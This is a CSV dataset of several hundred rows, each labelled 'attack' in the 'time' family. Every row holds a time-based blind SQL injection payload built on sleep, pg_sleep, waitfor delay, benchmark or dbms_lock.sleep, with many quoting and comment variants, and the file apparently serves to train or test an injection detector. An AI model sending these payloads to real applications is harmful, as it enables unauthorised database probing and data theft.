label,payload,family
attack,1   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   9288  =  9288,time
attack,waitfor delay '0:0:5' and 'gsvt'  =  'gsvt,time
attack,1' where 6035  =  6035 waitfor delay '0:0:5'--,time
attack,"1%""   )    )     )   rlike sleep  (  5  )  #",time
attack,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   ""hxdd""  =  ""hxdd",time
attack,"1""  )   as dezr where 2145  =  2145 or sleep  (  5  )  #",time
attack,"1%""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""%""  =  """,time
attack,"1%"" waitfor delay '0:0:5'--",time
attack,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,waitfor delay '0:0:5'  )  +',time
attack,1' or sleep  (  5  )   and 'udqz'  =  'udqz,time
attack,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,time
attack,select pg_sleep  (  5  )   and    (    (   'rnzp'  =  'rnzp,time
attack,1'  )   where 6222  =  6222 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,time
attack,1'  )   where 8142  =  8142 waitfor delay '0:0:5'--,time
attack,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",time
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",time
attack,"1' in boolean mode  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   ",time
attack,"1%""   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1'   )    )    as fusi where 2788  =  2788 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",time
attack,1'   )    )    rlike sleep  (  5  )  #,time
attack,"1  )   as agex where 8167  =  8167 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",time
attack,1%'   )    )    waitfor delay '0:0:5'--,time
attack,"1%"" or sleep  (  5  )   and ""%""  =  """,time
attack,"waitfor delay '0:0:5' and    (    (   ""ykgm""  =  ""ykgm",time
attack,1 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,select sleep  (  5  )   and   (  'vwmx'  =  'vwmx,time
attack,select sleep  (  5  )   and 'yzix'  =  'yzix,time
attack,"1%"" and sleep  (  5  )   and ""%""  =  """,time
attack,"1' and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1%""   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,1%' rlike sleep  (  5  )   and '%'  =  ',time
attack,"1' in boolean mode  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1'||  (  select 'zeet' from dual where 9567  =  9567 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,"1%""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",time
attack,1  )   or sleep  (  5  )  #,time
attack,"1""   )    )     )   and sleep  (  5  )  #",time
attack,"1""  )   as ghpx where 2873  =  2873 waitfor delay '0:0:5'--",time
attack,"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""cwwv"" like ""cwwv",time
attack,1   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,"1%""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",time
attack,"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'medg'  =  'medg",time
attack,1'  )   and sleep  (  5  ) ,time
attack,"1""  )   waitfor delay '0:0:5' and   (  ""vjpg""  =  ""vjpg",time
attack,1' rlike sleep  (  5  ) ,time
attack,1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,1   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  4574  =  4574,time
attack,1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'mqoj' like 'mqoj,time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""poik""  =  ""poik",time
attack,1  )   where 4653  =  4653 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,time
attack,"1'  )   where 3476  =  3476 and elt  (  1210  =  1210,sleep  (  5   )    )   --",time
attack,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""fvrq""  =  ""fvrq",time
attack,1   )    )     )   or sleep  (  5  )   and    (    (     (  2209  =  2209,time
attack,"1%""  )   or sleep  (  5  )  #",time
attack,1 waitfor delay '0:0:5'--,time
attack,else dbms_lock.sleep  (  0  ) ,time
attack,"1""   )    )    as yuqr where 7226  =  7226 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",time
attack,"select pg_sleep  (  5  )   and    (    (   ""byhx"" like ""byhx",time
attack,"1%""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",time
attack,"1%'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   '%'  =  '",time
attack,waitfor delay '0:0:5' and '%'  =  ',time
attack,1' where 4403  =  4403 rlike sleep  (  5  )  #,time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",time
attack,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",time
attack,1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'svuu'  =  'svuu,time
attack,"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'mbxh' like 'mbxh",time
attack,select pg_sleep  (  5  )   and    (    (   '%'  =  ',time
attack,"1""   )    )    as rhea where 2982  =  2982 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",time
attack,select pg_sleep  (  5  ) ,time
attack,"1""  )   where 2922  =  2922 or elt  (  6272  =  6272,sleep  (  5   )    )   --",time
attack,"1""   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,select sleep  (  5  )   and    (    (   'uyft'  =  'uyft,time
attack,1' in boolean mode  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt,time
attack,1' where 9003  =  9003 waitfor delay '0:0:5'--,time
attack,1   )    )    waitfor delay '0:0:5'--,time
attack,"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""utlk"" like ""utlk",time
attack,"1%""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",time
attack,"1,  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )   ",time
attack,1'||  (  select 'sdll' where 5074  =  5074 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   ||',time
attack,"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  ",time
attack,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,time
attack,"1"" where 7371  =  7371 waitfor delay '0:0:5'--",time
attack,1%'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"1""   )    )    waitfor delay '0:0:5'--",time
attack,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'lzbn'  =  'lzbn,time
attack,"1%""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""%""  =  """,time
attack,"1%"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""%""  =  """,time
attack,1'   )    )    waitfor delay '0:0:5' and    (    (   'jcfe'  =  'jcfe,time
attack,"1,  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",time
attack,"1' in boolean mode  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,1' and sleep  (  5  )   and 'kapr'  =  'kapr,time
attack,"1"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""mynm"" like ""mynm",time
attack,"1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"waitfor delay '0:0:5' and    (    (   ""%""  =  """,time
attack,"1"" where 9792  =  9792 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",time
attack,"1""  )   as ymsc where 3694  =  3694 waitfor delay '0:0:5'--",time
attack,1'  )   where 5540  =  5540 waitfor delay '0:0:5'--,time
attack,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""eakt"" like ""eakt",time
attack,"1'+  (  select vxax where 9036  =  9036 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'",time
attack,1  )   as bpap where 7758  =  7758 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )   ",time
attack,1%'   )    )     )   rlike sleep  (  5  )  #,time
attack,"1%""   )    )     )   or sleep  (  5  )  #",time
attack,"1%""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'nczi'  =  'nczi",time
attack,1   )    )    rlike sleep  (  5  )  #,time
attack,1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,"1""  )   as yzny where 4869  =  4869 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --",time
attack,"1%""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""%""  =  """,time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and '%'  =  ',time
attack,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'uzmy' like 'uzmy,time
attack,"1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'vnkr' like 'vnkr,time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'nslo' like 'nslo",time
attack,"1%""   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  ""%""  =  """,time
attack,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,time
attack,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",time
attack,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""phcl"" like ""phcl",time
attack,1   )    )    as jvoo where 5116  =  5116 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"1""  )   where 4172  =  4172 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",time
attack,1 or sleep  (  5  )  -- nrzf,time
attack,select sleep  (  5  )   and '%'  =  ',time
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'lbmp'  =  'lbmp,time
attack,"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   #",time
attack,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,time
attack,"1   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'bmnf' like 'bmnf,time
attack,1   )    )    as beld where 1679  =  1679 or sleep  (  5  )  #,time
attack,1'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,1  )   where 1929  =  1929 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,time
attack,1'   )    )    as jbcd where 9078  =  9078 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,time
attack,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",time
attack,"1'+  (  select oogh where 1167  =  1167 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1%""   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1' and sleep  (  5  )  #,time
attack,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   ""%""  =  """,time
attack,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,time
attack,1%'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  '%'  =  ',time
attack,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'mhvy' like 'mhvy",time
attack,select sleep  (  5  )   and    (    (     (  'thqr' like 'thqr,time
attack,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",time
attack,"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'wesl'  =  'wesl",time
attack,"1%""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1""  )   and sleep  (  5  )   and   (  ""fsuf"" like ""fsuf",time
attack,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  3124  =  3124,time
attack," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",time
attack,select sleep  (  5  )   and 'hhrw' like 'hhrw,time
attack,1' in boolean mode  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'pjrf'  =  'pjrf",time
attack,1'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  'ugrk'  =  'ugrk,time
attack,"1%'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,time
attack,1 and sleep  (  5  )  #,time
attack,"1""   )    )    as gbxx where 2459  =  2459 waitfor delay '0:0:5'--",time
attack,"1""   )    )     )   or sleep  (  5  )  #",time
attack,"1""   )    )     )   rlike sleep  (  5  )  #",time
attack,waitfor delay '0:0:5' and    (    (   'uvlf'  =  'uvlf,time
attack,1'  )   as ftyp where 5851  =  5851 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  8600  =  8600",time
attack,"1' where 5786  =  5786 and elt  (  1210  =  1210,sleep  (  5   )    )   --",time
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",time
attack,"1%""   )    )     )   waitfor delay '0:0:5'--",time
attack,"1""  )   where 9086  =  9086 or sleep  (  5  )  #",time
attack,"1""   )    )    as dpln where 4193  =  4193 rlike sleep  (  5  )  --",time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags,time
attack,select pg_sleep  (  5  )   and 'qfaz' like 'qfaz,time
attack,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",time
attack,"select pg_sleep  (  5  )   and    (    (   ""%""  =  """,time
attack,1'   )    )     )   waitfor delay '0:0:5'--,time
attack,"1""   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   ""umfr"" like ""umfr",time
attack,"1""  )   where 4878  =  4878 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",time
attack,"make_set  (  8734  =  8734,sleep  (  5   )    )   ",time
attack,"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'cwjd'  =  'cwjd",time
attack,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv,time
attack,select sleep  (  5  )   and   (  'qcsv'  =  'qcsv,time
attack,1%'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   '%'  =  ',time
attack,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,time
attack,"select pg_sleep  (  5  )   and   (  ""tpry""  =  ""tpry",time
attack,"1""   )    )    or sleep  (  5  )   and    (    (   ""mtmb"" like ""mtmb",time
attack,1  )   and sleep  (  5  ) ,time
attack,1   )    )     )   rlike sleep  (  5  )   and    (    (     (  6790  =  6790,time
attack,"1""  )   where 7914  =  7914 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",time
attack,"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""ckht""  =  ""ckht",time
attack,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fupe'  =  'fupe,time
attack,1%'  )   or sleep  (  5  )  #,time
attack,1'||  (  select 'ypqa' where 1961  =  1961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',time
attack,"1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1""  )   where 7588  =  7588 waitfor delay '0:0:5'--",time
attack,1  )   as obzn where 7652  =  7652 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'mcrt'  =  'mcrt,time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   --",time
attack,select sleep  (  5  )  # yrpn,time
attack,"1"" waitfor delay '0:0:5' and ""syhx""  =  ""syhx",time
attack,1  )   waitfor delay '0:0:5',time
attack,"1""  )   where 9656  =  9656 and sleep  (  5  )  --",time
attack,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'glfq' like 'glfq,time
attack,"1'  )   where 6248  =  6248 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'fgcg'  =  'fgcg",time
attack,"1""   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  ""azmf""  =  ""azmf",time
attack,"1   )    )    as qgok where 3993  =  3993 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",time
attack,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""koni"" like ""koni",time
attack,1'+  (  select bjav where 6923  =  6923 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,select sleep  (  5  )   and 'mlmu'  =  'mlmu,time
attack,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   # pkcp,time
attack,1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'yctp'  =  'yctp,time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  'pfle' like 'pfle,time
attack,"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""tuhy"" like ""tuhy",time
attack,"1""   )    )    as uqkn where 4642  =  4642 or elt  (  6272  =  6272,sleep  (  5   )    )   --",time
attack, (  select   (  case when   (  9337  =  9337  )   then waitfor delay '0:0:5' else 9337*  (  select 9337 from master..sysdatabases  )   end   )    ) ,time
attack,1  )   or sleep  (  5  )   and   (  2211  =  2211,time
attack,1%'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   '%'  =  ',time
attack,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",time
attack,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,time
attack,"1',  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )   ",time
attack,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",time
attack,"1  )   as qyic where 9736  =  9736 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,time
attack,select pg_sleep  (  5   )    )   +',time
attack,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,time
attack,"1  )   where 3062  =  3062 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",time
attack,1' where 5458  =  5458 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'bemh'  =  'bemh",time
attack,1'  )   as irck where 3660  =  3660 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,time
attack,"1""  )   as lexx where 2892  =  2892 or elt  (  6272  =  6272,sleep  (  5   )    )   --",time
attack,"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""xbft""  =  ""xbft",time
attack,waitfor delay '0:0:5' and   (  4614  =  4614,time
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'vmuj' like 'vmuj",time
attack,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'zizo' like 'zizo",time
attack,1 and sleep  (  5  ) ,time
attack,"1  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  5333  =  5333,time
attack,"1"" where 6686  =  6686 or elt  (  6272  =  6272,sleep  (  5   )    )   --",time
attack,1' and sleep  (  5  )   and 'pfgy'  =  'pfgy,time
attack,"1%""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""%""  =  """,time
attack,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'qiau'  =  'qiau,time
attack,1 where 9393  =  9393 waitfor delay '0:0:5'--,time
attack,"1%"" and sleep  (  5  )  #",time
attack,"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"create or replace function sleep  (  int  )   returns int as '/lib/libc.so.6','sleep' language 'c' strict",time
attack,1'  )   or sleep  (  5  )   and   (  'kgbm'  =  'kgbm,time
attack,"1'||  (  select 'eils' where 8308  =  8308 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"1'||  (  select 'bccx' where 5881  =  5881 and elt  (  1210  =  1210,sleep  (  5   )    )     )  ||'",time
attack,"1""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""zlwb""  =  ""zlwb",time
attack,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,time
attack,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd",time
attack,1%'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  '%'  =  ',time
attack,"1""   )    )    as vhrq where 1690  =  1690 and elt  (  1210  =  1210,sleep  (  5   )    )   --",time
attack,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",time
attack,waitfor delay '0:0:5' and    (    (   '%'  =  ',time
attack,1'+  (  select 'qxmo' where 9511  =  9511 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,"1""  )   where 5938  =  5938 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",time
attack,1   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,1'  )   where 6440  =  6440 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",time
attack,"1'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1'+  (  select iaeu where 5509  =  5509 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"1'  )   as mmhe where 2142  =  2142 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",time
attack,"1  )   where 5234  =  5234 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"1   )    )    as zkrr where 4730  =  4730 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",time
attack,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'wvzb'  =  'wvzb,time
attack,"waitfor delay '0:0:5' and   (  ""dmcu""  =  ""dmcu",time
attack,1'  )   as hqaq where 6411  =  6411 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,"1%'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  '%'  =  '",time
attack,1' where 9024  =  9024 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,time
attack,waitfor delay '0:0:5',time
attack,1'||  (  select 'ucro' where 9912  =  9912 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,"1%""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   ""%""  =  """,time
attack,1' rlike sleep  (  5  )   and 'ojqz' like 'ojqz,time
attack,select sleep  (  5  )  # wihl,time
attack,"1'+  (  select 'dbvq' where 2045  =  2045 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"1'  )   as idqc where 5288  =  5288 and elt  (  1210  =  1210,sleep  (  5   )    )   --",time
attack,"1""   )    )    as gprr where 5975  =  5975 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,1' where 1045  =  1045 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,time
attack,1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  '%'  =  ',time
attack,1%'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""fkmh""  =  ""fkmh",time
attack,1'||  (  select 'qtep' where 2572  =  2572 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,1 rlike sleep  (  5  ) ,time
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'vbck' like 'vbck,time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",time
attack,"1%"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""%""  =  """,time
